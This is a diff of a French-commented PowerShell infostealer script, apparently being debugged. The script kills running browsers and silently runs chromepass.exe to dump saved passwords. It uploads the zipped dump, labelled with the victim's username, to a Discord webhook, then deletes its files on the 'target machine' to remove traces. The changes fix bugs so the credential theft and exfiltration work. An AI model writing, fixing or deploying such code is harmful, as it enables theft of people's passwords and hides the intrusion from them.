@@ -26,17 +26,19 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION SILENCIEUSE CORRIGÉE POUR CHROMEPASS ---
-$explorer = Get-Process -IncludeUserName \vert{} Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
+# --- EXTRACTION CHROMEPASS AVEC DOSSIER DE TRAVAIL FORCÉ ---
+$explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
 
-if ($explorer) {$processInfo = New-Object System.Diagnostics.ProcessStartInfo
+if ($explorer) {
+    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
     $processInfo.FileName = "$basePath\chromepass.exe"
-    $processInfo.Arguments = "/stext `"$basePath\passwords.txt`""
-    $processInfo.UseShellExecute =$true
+    $processInfo.Arguments = "/stext passwords.txt"
+    $processInfo.WorkingDirectory = $basePath
+    $processInfo.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($processInfo) | Out-Null
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 6
 } else {
-    Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -Wait -WindowStyle Hidden
+    Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext passwords.txt" -WorkingDirectory $basePath -Wait -WindowStyle Hidden
 }
 
 # Exécution des autres outils avec chemins absolus
@@ -66,7 +68,7 @@ if (!(Test-Path $dumpFile)) { exit 1 }
 # Envoi du fichier ZIP sur le webhook Discord
 if (-not ("System.Net.Http.HttpClient" -as [type])) {
     $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
-    if ($httpPath) { Add-Type -Path$httpPath } else { exit 1 }
+    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
 }
 
 $client = New-Object System.Net.Http.HttpClient
@@ -74,14 +76,16 @@ $content = New-Object System.Net.Http.MultipartFormDataContent
 $content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")
 
 $fileStream = [System.IO.File]::OpenRead("$dumpFile")
-$fileContent = New-Object System.Net.Http.StreamContent($fileStream)$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
 $content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))
 
 try { 
-    $client.PostAsync($WebhookUrl,$content).Wait() 
+    $client.PostAsync($WebhookUrl, $content).Wait() 
 } catch {}
 
-$fileStream.Close()$fileStream.Dispose()
+$fileStream.Close()
+$fileStream.Dispose()
 
 # Nettoyage des traces sur la machine cible
 Remove-Item -Recurse -Force $basePath
